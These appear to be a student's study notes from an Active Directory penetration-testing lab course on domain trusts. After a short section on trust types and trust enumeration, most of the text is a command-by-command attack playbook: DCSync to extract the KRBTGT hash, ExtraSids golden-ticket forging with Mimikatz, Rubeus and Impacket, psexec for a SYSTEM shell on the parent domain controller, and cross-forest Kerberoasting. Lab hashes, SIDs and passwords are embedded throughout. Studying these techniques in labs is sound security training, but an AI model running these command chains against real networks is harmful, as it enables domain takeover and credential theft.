## What is Domain trust 
Integrate [trusts](https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) between domains to migrate AD environments. 
Used to establish forest-forest or domain-domain authentication. 
May Allow one way or two way communication. 
### Types of Trust
- `Parent-child`: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain `corp.inlanefreight.local` could authenticate into the parent domain `inlanefreight.local`, and vice-versa.
- `Cross-link`: A trust between child domains to speed up authentication.
- `External`: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes [SID filtering](https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) or filters out authentication requests (by SID) not from the trusted domain.
- `Tree-root`: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- `Forest`: A transitive trust between two forest root domains.
- [ESAE](https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.
*Trusts can also be transitive or non-transitive*
- `transitive` trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if `Domain A` has a trust with `Domain B`, and `Domain B` has a `transitive` trust with `Domain C`, then `Domain A` will automatically trust `Domain C`.
- In a `non-transitive trust`, the child domain itself is the only one trusted.
*trusts can be set up in two directions*
- `One-way trust`: Users in a `trusted` domain can access resources in a trusting domain, not vice-versa.
- `Bidirectional trust`: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in `INLANEFREIGHT.LOCAL` would be able to access resources in `FREIGHTLOGISTICS.LOCAL`, and vice-versa.
![[Domain Trust.png]]
## Enumerating Trust Relationships
[Get-ADTrust](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps) cmdlet
```powershell
Import-Module activedirectory
```

```powershell
Get-ADTrust -Filter *
```
#### PowerView
```powershell
Get-DomainTrust 
```

```powershell
Get-DomainTrustMapping
```
##### Check Users in Child Domain 
```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
#### netdom
##### query domain trust 
```cmd
netdom query /domain:inlanefreight.local trust
```

##### Query DCs
```cmd
netdom query /domain:inlanefreight.local dc
```
##### Query Work Stations and servers
```cmd
netdom query /domain:inlanefreight.local workstation
```

# Attacking Domain Trusts
## Child > Parent From Windows
### [sidHistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory)
An attribute use in migration scenario. If a user in one domain is migrated, a new account is created in the second domain.

Original SID will be added to the new users SID history attribute to ensure that the user can access original resources. 

Intended to work across domains but can work in the same domain.
Can perform a SIDhistory injection via Mimikatz to add an administrator account to the SID history attribute of an account they control. 

May be able to then peform DCSync or create a [golden ticket](https://attack.mitre.org/techniques/T1558/001/).
#### Requirements
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.
Allows compromise of a parent domain.
###### Obtaining the KRBTGT Account hash
First, we need to otain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory
```powershell
mimikatz # lsadump::dcsync /user:LOCAL\krbtgt
```
###### Get the SID (powerview)
```powershell
Get-DomainSID
```
###### Obtain Enterprise Admins Group SID
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
#### ExtraSIDS attack mimikatz
###### Create a Golden Ticket
```powershell
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
###### Confirm Keberos Ticket is in Memory 
```powerlist
klist
```
###### List the C: Drive of DC
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```
#### ExtraSids Attack Rubeus
###### Create a Golden Tickets
```powershell-session
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
###### Confirm The tickets
```powershell
klist
```
#### Perform a DCSync 
```powershell
\mimikatz.exe
```

```powershell
lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
If dealing with multiple domains
```powershell
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

## Child > Parent From Linux
Need the same Information 
- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain
**Once Control has been gained on Child domain perform DC Sync**
### Manual
#### DC Sync on child domain 
Aquire the KRBTGT account hash
```shell
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
#### Get the User SID 
```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 
```
https://adsecurity.org/?p=1001
 Common SIDS, add the RID to the end of the user SID
#### Get the  Child Domain SID
```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
```
Get Target Domain Sid
```shell
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
#### Construct the Golden Ticket
```shell
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
#### Setting KRB5CCNAME Environmental Variable
```shell
export KRB5CCNAME=hacker.ccache 
```
#### Get System Shell
```shell
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
### Can also use raiseChild to automate escalating from child to paarent domain. 
```shell
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
HTB_@cademy_stdnt_admin!
## Cross-Forest Trust Abuse - from Windows
Can likely perform kerberoasting and ASREPRoasting attacks across trusts.

With Bidirectional Trust can likely gain a foothold. 
### Enumerate Accounts for Associated SPNs using PowerView. 
```powershell
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
#### Enumerating a user 
```powershell
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
Looking for a member of a privileged group like enterpise or domain admins 
### Kerberoasting attack
#### Rubeus
```powershell
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
Crack through hashcat

### Admin Password  Re-Use and Group Membership 
If there is a bi-directional trust and admins have the same name then it is worth retrying passwords. On both domains. 
#### Enumerate groups with users that do not belong to the domain 
This is known as foreign group membership 
```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
#### Attempt to access a PSSession with these groups
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\<user>
```
Can take over a DC using this method 
### SID History Abuse - Cross Forest
Can also abuse SID history across a forest trust. 
A user must be migrated from one forest to another and SID Filtering is not enabled. 
![[Pasted image 20230819115320.png]]
##  Cross-Forest Trust Abuse - from Linux
### Cross Forest Kerberoasting

```shell
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
Find Users
#### Request the TGS ticket
```shell
 GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```
### Hunting Foreign Group Membership with Bloodhound
May need to add the domains into /etc/resolv.conf
```shell
#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```
Run bloodhound-python on both Domains
```shell
 bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```

```shell
bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2
```
#### Viewing Dangerous Rights in Bloodhound 
![[Pasted image 20230819120814.png]]
